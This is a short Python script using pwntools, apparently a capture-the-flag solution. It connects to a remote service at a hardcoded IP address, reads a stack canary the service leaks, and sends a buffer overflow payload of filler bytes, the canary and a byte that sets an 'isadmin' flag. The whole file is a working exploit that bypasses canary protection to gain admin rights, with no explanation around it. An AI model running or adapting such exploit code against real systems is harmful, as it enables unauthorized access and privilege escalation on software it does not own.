#!/bin/env python3
import sys
from pwn import *

conn = remote('170.64.222.246', 1340)
conn.recvuntil("is ")

str_canary = conn.recvuntil("\r\n").decode("utf-8").rstrip("\r\n")
int_canary = int(str_canary)
byte_canary = int_canary.to_bytes(4, 'little')
print(byte_canary)

buffer = b"AAAABBBBCCCCDDDD"
isadmin = b"\x01"

s = buffer + byte_canary + isadmin
# print()
conn.sendline(s)
print(conn.recvall(3))

conn.close()